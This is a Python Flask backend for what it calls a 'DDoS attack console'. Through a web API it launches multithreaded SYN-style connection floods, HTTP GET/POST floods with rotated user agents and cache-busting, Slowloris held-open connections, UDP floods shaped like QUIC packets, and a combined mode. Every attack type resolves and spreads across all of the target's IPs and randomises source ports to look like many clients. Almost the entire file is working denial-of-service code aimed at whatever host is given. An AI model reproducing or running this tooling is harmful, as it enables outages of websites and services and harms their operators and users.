"""
DDoS 攻擊控制台 - Flask 後端
提供 Web API 來執行攻擊測試
增強版：支持 HTTP/2、QUIC、多 IP、獨立請求計數
pip install flask flask-cors httpx dnspython requests
"""
from flask import Flask, render_template, jsonify, request
from flask_cors import CORS
import threading
import socket
import time
import random
import struct
from collections import Counter
import os
import dns.resolver
from urllib.parse import urlparse
import httpx  # 支持 HTTP/2 和 HTTP/3

app = Flask(__name__)
CORS(app)

# 全局變量
attack_running = False
attack_stats = {
    'packets': 0,
    'connections': 0,
    'requests': 0,           # 真實請求數（不依賴連接）
    'retries': 0,            # 重試次數
    'successful_requests': 0, # 成功的請求
    'failed_requests': 0,    # 失敗的請求
    'http2_requests': 0,     # HTTP/2 請求數
    'http3_requests': 0,     # HTTP/3 (QUIC) 請求數
    'unique_source_ports': 0, # 使用的不同源端口數
    'errors': Counter()
}
stats_lock = threading.Lock()
attack_threads = []
resolved_ips = []  # DNS 解析的多個 IP
source_ports_used = set()  # 追蹤使用的源端口

# 延遲追蹤
latency_data = {
    'syn': [],
    'http-get': [],
    'http-post': [],
    'slowloris': [],
    'udp': [],
    'combo': []
}
latency_lock = threading.Lock()

def increment_stat(stat_name, value=1):
    """增加統計數據"""
    global attack_stats
    with stats_lock:
        if stat_name in attack_stats:
            attack_stats[stat_name] += value

def add_error(error_type):
    """記錄錯誤"""
    global attack_stats
    with stats_lock:
        attack_stats['errors'][error_type] += 1

def track_source_port(port):
    """追蹤使用的源端口"""
    global source_ports_used
    with stats_lock:
        if port not in source_ports_used:
            source_ports_used.add(port)
            attack_stats['unique_source_ports'] = len(source_ports_used)

def track_latency(attack_type, latency_ms):
    """記錄延遲數據"""
    global latency_data
    with latency_lock:
        if attack_type in latency_data:
            latency_data[attack_type].append(latency_ms)
            # 只保留最近 100 筆數據
            if len(latency_data[attack_type]) > 100:
                latency_data[attack_type] = latency_data[attack_type][-100:]

def get_average_latency(attack_type):
    """獲取平均延遲"""
    with latency_lock:
        if attack_type in latency_data and len(latency_data[attack_type]) > 0:
            return sum(latency_data[attack_type]) / len(latency_data[attack_type])
        return None

def resolve_target_ips(target_host):
    """解析目標主機的所有 IP 地址（IPv4 和 IPv6）"""
    ips = []
    try:
        # 解析 A 記錄（IPv4）
        try:
            answers = dns.resolver.resolve(target_host, 'A')
            for rdata in answers:
                ips.append(('ipv4', str(rdata)))
                print(f"  [DNS] A 記錄: {rdata}")
        except:
            pass
        
        # 解析 AAAA 記錄（IPv6）
        try:
            answers = dns.resolver.resolve(target_host, 'AAAA')
            for rdata in answers:
                ips.append(('ipv6', str(rdata)))
                print(f"  [DNS] AAAA 記錄: {rdata}")
        except:
            pass
        
        # 如果是 IP 地址直接使用
        if not ips:
            try:
                socket.inet_pton(socket.AF_INET, target_host)
                ips.append(('ipv4', target_host))
            except:
                try:
                    socket.inet_pton(socket.AF_INET6, target_host)
                    ips.append(('ipv6', target_host))
                except:
                    pass
    except Exception as e:
        print(f"[DNS] 解析失敗: {e}")
    
    return ips if ips else [('ipv4', '127.0.0.1')]

# ==================== 攻擊實現 ====================

def syn_flood_attack(target_ip, target_port, duration, attack_type='syn'):
    """SYN Flood 增強版 - 每次使用不同源端口"""
    global attack_running
    print(f"[SYN] 線程啟動: {target_ip}:{target_port}")
    
    sockets_pool = []
    start_time = time.time()
    
    while attack_running and (time.time() - start_time) < duration:
        try:
            conn_start = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.001)
            sock.setblocking(False)
            
            # 綁定隨機源端口（讓每個連接看起來來自不同客戶端）
            try:
                source_port = random.randint(10000, 65535)
                sock.bind(('', source_port))
                track_source_port(source_port)
            except:
                pass  # 端口被佔用，使用系統分配
            
            try:
                sock.connect((target_ip, target_port))
            except (BlockingIOError, socket.error):
                pass
            
            # 記錄延遲
            latency = (time.time() - conn_start) * 1000
            track_latency(attack_type, latency)
            
            increment_stat('connections')
            increment_stat('requests')  # 每次連接嘗試算一次請求
            
            if len(sockets_pool) < 50:
                sockets_pool.append(sock)
            else:
                try:
                    sock.close()
                except:
                    pass
            
            if len(sockets_pool) >= 50:
                old_sock = sockets_pool.pop(0)
                try:
                    old_sock.close()
                except:
                    pass
                    
        except Exception as e:
            add_error(f"SYN: {type(e).__name__}")
            increment_stat('failed_requests')
            time.sleep(0.01)
    
    for sock in sockets_pool:
        try:
            sock.close()
        except:
            pass
    
    print(f"[SYN] 線程停止")

def http_flood_attack(target_ip, target_port, method, duration, use_http2=True, attack_type='http-get'):
    """HTTP Flood 增強版 - 支持 HTTP/2 和獨立請求計數"""
    global attack_running
    
    print(f"[HTTP {method}] 線程啟動: {target_ip}:{target_port} (HTTP/2={use_http2})")
    
    target_url = f"http://{target_ip}:{target_port}"
    paths = ["/", "/api", "/search", "/login", "/data", "/user", "/product"]
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0",
    ]
    
    start_time = time.time()
    max_retries = 2
    
    # 使用 httpx 支持 HTTP/2
    try:
        if use_http2:
            client = httpx.Client(http2=True, timeout=3.0)
        else:
            client = httpx.Client(http2=False, timeout=3.0)
    except:
        # 如果 httpx 不可用，回退到 requests
        import requests
        client = requests.Session()
        use_http2 = False
    
    while attack_running and (time.time() - start_time) < duration:
        retry_count = 0
        success = False
        
        while retry_count <= max_retries and not success:
            try:
                req_start = time.time()
                url = target_url + random.choice(paths) + f"?_={random.randint(1, 999999)}"
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "*/*",
                    "Cache-Control": "no-cache",
                    "X-Request-ID": f"{random.randint(1, 9999999)}",
                }
                
                increment_stat('requests')  # 每次請求都計數（不管連接復用）
                
                if use_http2 and hasattr(client, 'request'):
                    # httpx 客戶端
                    response = client.request(method, url, headers=headers)
                    if response.http_version == "HTTP/2":
                        increment_stat('http2_requests')
                else:
                    # requests 客戶端
                    if method == "GET":
                        response = client.get(url, headers=headers, timeout=3)
                    elif method == "POST":
                        data = {"test": random.randint(1, 10000), "ts": time.time()}
                        response = client.post(url, json=data, headers=headers, timeout=3)
                
                # 記錄延遲
                latency = (time.time() - req_start) * 1000
                track_latency(attack_type, latency)
                
                increment_stat('successful_requests')
                success = True
                
            except Exception as e:
                retry_count += 1
                increment_stat('retries')
                
                if retry_count > max_retries:
                    add_error(f"HTTP {type(e).__name__}")
                    increment_stat('failed_requests')
                else:
                    time.sleep(0.05)  # 重試前短暫等待
    
    try:
        client.close()
    except:
        pass
    
    print(f"[HTTP {method}] 線程停止")

def slowloris_attack(target_ip, target_port, duration, attack_type='slowloris'):
    """Slowloris 增強版 - 每個連接使用不同源端口"""
    global attack_running
    print(f"[Slowloris] 線程啟動: {target_ip}:{target_port}")
    
    sockets = []
    
    # 創建半完成的 HTTP 請求
    for _ in range(50):
        if not attack_running:
            break
        try:
            conn_start = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            
            # 綁定隨機源端口
            try:
                source_port = random.randint(10000, 65535)
                sock.bind(('', source_port))
                track_source_port(source_port)
            except:
                pass
            
            sock.connect((target_ip, target_port))
            
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(f"Host: {target_ip}\r\n".encode())
            sock.send(b"User-Agent: Mozilla/5.0\r\n")
            
            # 記錄延遲
            latency = (time.time() - conn_start) * 1000
            track_latency(attack_type, latency)
            
            sockets.append(sock)
            increment_stat('connections')
            increment_stat('requests')  # 初始請求
        except:
            increment_stat('failed_requests')
    
    start_time = time.time()
    
    # 持續發送不完整的標頭
    while attack_running and (time.time() - start_time) < duration:
        try:
            for sock in list(sockets):
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    increment_stat('packets')
                except:
                    sockets.remove(sock)
                    increment_stat('failed_requests')
            
            time.sleep(10)
            
        except Exception as e:
            add_error(f"Slowloris: {type(e).__name__}")
    
    for sock in sockets:
        try:
            sock.close()
        except:
            pass
    
    print(f"[Slowloris] 線程停止")

def udp_flood_attack(target_ip, target_port, duration, attack_type='udp'):
    """UDP Flood 增強版 - 使用不同源端口和 QUIC 模擬"""
    global attack_running
    print(f"[UDP] 線程啟動: {target_ip}:{target_port}")
    
    payload_sizes = [64, 128, 256, 512, 1024, 1200]  # 1200 接近 QUIC 初始包大小
    start_time = time.time()
    
    while attack_running and (time.time() - start_time) < duration:
        try:
            packet_start = time.time()
            # 每次創建新 socket 使用不同源端口
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # 綁定隨機源端口
            try:
                source_port = random.randint(10000, 65535)
                sock.bind(('', source_port))
                track_source_port(source_port)
            except:
                pass  # 使用系統分配端口
            
            size = random.choice(payload_sizes)
            
            # 50% 機率模擬 QUIC 包格式
            if random.random() > 0.5 and size >= 1200:
                # QUIC 初始包特徵（簡化版）
                payload = bytearray(size)
                payload[0] = 0xC0 | random.randint(0, 15)  # Long header + version
                payload[1:5] = random.randbytes(4)  # Version
                payload[5:21] = random.randbytes(16)  # Destination Connection ID
                payload[21:] = random.randbytes(size - 21)  # Payload
                increment_stat('http3_requests')
            else:
                payload = random.randbytes(size)
            
            sock.sendto(bytes(payload), (target_ip, target_port))
            
            # 記錄延遲
            latency = (time.time() - packet_start) * 1000
            track_latency(attack_type, latency)
            
            increment_stat('packets')
            increment_stat('requests')  # UDP 也算請求數
            increment_stat('successful_requests')
            
            sock.close()
            
        except Exception as e:
            add_error(f"UDP: {type(e).__name__}")
            increment_stat('failed_requests')
            time.sleep(0.001)
    
    print(f"[UDP] 線程停止")

# ==================== API 端點 ====================

@app.route('/')
def index():
    """返回控制台頁面"""
    html_path = os.path.join(os.path.dirname(__file__), 'attack_control.html')
    with open(html_path, 'r', encoding='utf-8') as f:
        return f.read()

@app.route('/api/start', methods=['POST'])
def start_attack():
    """啟動攻擊 - 增強版支持多 IP 和 DNS 解析"""
    global attack_running, attack_threads, attack_stats, resolved_ips, source_ports_used
    
    if attack_running:
        return jsonify({'success': False, 'error': '攻擊已在運行中'})
    
    data = request.json
    attack_type = data.get('type')
    target_ip = data.get('ip', '127.0.0.1')
    target_port = int(data.get('port', 8000))
    udp_port = int(data.get('udpPort', 9001))
    thread_count = int(data.get('threads', 50))
    duration = int(data.get('duration', 30))
    
    # DNS 解析目標 IP
    print(f"[DNS] 解析目標: {target_ip}")
    resolved_ips = resolve_target_ips(target_ip)
    print(f"[DNS] 解析到 {len(resolved_ips)} 個 IP 地址")
    
    # 重置統計
    with stats_lock:
        attack_stats = {
            'packets': 0,
            'connections': 0,
            'requests': 0,
            'retries': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'http2_requests': 0,
            'http3_requests': 0,
            'unique_source_ports': 0,
            'errors': Counter()
        }
        source_ports_used.clear()
    
    attack_running = True
    attack_threads = []
    
    # 平均分配線程到不同 IP
    threads_per_ip = max(1, thread_count // len(resolved_ips))
    
    # 根據攻擊類型啟動線程
    if attack_type == 'syn':
        for ip_type, ip_addr in resolved_ips:
            for _ in range(threads_per_ip):
                t = threading.Thread(target=syn_flood_attack, args=(ip_addr, target_port, duration, 'syn'), daemon=True)
                t.start()
                attack_threads.append(t)
    
    elif attack_type == 'http-get':
        for ip_type, ip_addr in resolved_ips:
            for _ in range(threads_per_ip):
                t = threading.Thread(target=http_flood_attack, args=(ip_addr, target_port, 'GET', duration, True, 'http-get'), daemon=True)
                t.start()
                attack_threads.append(t)
    
    elif attack_type == 'http-post':
        for ip_type, ip_addr in resolved_ips:
            for _ in range(threads_per_ip):
                t = threading.Thread(target=http_flood_attack, args=(ip_addr, target_port, 'POST', duration, True, 'http-post'), daemon=True)
                t.start()
                attack_threads.append(t)
    
    elif attack_type == 'slowloris':
        for ip_type, ip_addr in resolved_ips:
            for _ in range(min(threads_per_ip // 5, 10)):  # Slowloris 不需要太多線程
                t = threading.Thread(target=slowloris_attack, args=(ip_addr, target_port, duration, 'slowloris'), daemon=True)
                t.start()
                attack_threads.append(t)
    
    elif attack_type == 'udp':
        for ip_type, ip_addr in resolved_ips:
            for _ in range(threads_per_ip):
                t = threading.Thread(target=udp_flood_attack, args=(ip_addr, udp_port, duration, 'udp'), daemon=True)
                t.start()
                attack_threads.append(t)
    
    elif attack_type == 'combo':
        for ip_type, ip_addr in resolved_ips:
            # SYN Flood
            for _ in range(threads_per_ip // 3):
                t = threading.Thread(target=syn_flood_attack, args=(ip_addr, target_port, duration, 'combo'), daemon=True)
                t.start()
                attack_threads.append(t)
            
            # HTTP Flood
            for _ in range(threads_per_ip // 3):
                t = threading.Thread(target=http_flood_attack, args=(ip_addr, target_port, 'GET', duration, True, 'combo'), daemon=True)
                t.start()
                attack_threads.append(t)
            
            # Slowloris
            for _ in range(5):
                t = threading.Thread(target=slowloris_attack, args=(ip_addr, target_port, duration, 'combo'), daemon=True)
                t.start()
                attack_threads.append(t)
    
    else:
        attack_running = False
        return jsonify({'success': False, 'error': '未知的攻擊類型'})
    
    return jsonify({
        'success': True,
        'message': f'已啟動 {len(attack_threads)} 個攻擊線程',
        'resolved_ips': [f"{ip_type}:{ip}" for ip_type, ip in resolved_ips]
    })

@app.route('/api/stop', methods=['POST'])
def stop_attack():
    """停止攻擊"""
    global attack_running
    attack_running = False
    
    # 等待線程結束
    for t in attack_threads:
        t.join(timeout=1)
    
    return jsonify({
        'success': True,
        'message': '攻擊已停止'
    })

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """獲取統計數據 - 增強版包含新指標"""
    with stats_lock:
        return jsonify({
            'packets': attack_stats['packets'],
            'connections': attack_stats['connections'],
            'requests': attack_stats['requests'],
            'retries': attack_stats.get('retries', 0),
            'successful_requests': attack_stats.get('successful_requests', 0),
            'failed_requests': attack_stats.get('failed_requests', 0),
            'http2_requests': attack_stats.get('http2_requests', 0),
            'http3_requests': attack_stats.get('http3_requests', 0),
            'unique_source_ports': attack_stats.get('unique_source_ports', 0),
            'errors': dict(attack_stats['errors']),
            'resolved_ips_count': len(resolved_ips)
        })

@app.route('/api/latency', methods=['GET'])
def get_latency():
    """獲取各種攻擊類型的平均延遲"""
    latency_result = {}
    for attack_type in ['syn', 'http-get', 'http-post', 'slowloris', 'udp', 'combo']:
        avg = get_average_latency(attack_type)
        latency_result[attack_type] = avg if avg is not None else 0
    return jsonify(latency_result)

if __name__ == '__main__':
    print("="*80)
    print("💣 DDoS 攻擊控制台 - Flask 後端 (增強版)")
    print("="*80)
    print("新功能:")
    print("  ✅ 獨立請求計數（不依賴 TCP 連接數）")
    print("  ✅ HTTP/2 支持（通過 httpx 庫）")
    print("  ✅ QUIC/HTTP3 模擬（UDP 包格式）")
    print("  ✅ 每個請求使用不同源端口")
    print("  ✅ DNS 解析多個 IP（A/AAAA 記錄）")
    print("  ✅ 重試機制和完整統計")
    print("="*80)
    print("啟動伺服器於: http://localhost:5000")
    print("請在瀏覽器中打開控制台頁面")
    print("\n⚠️  依賴套件（請先安裝）:")
    print("  pip install flask flask-cors httpx dnspython requests")
    print("="*80)
    
    app.run(host='0.0.0.0', port=5000, debug=False)
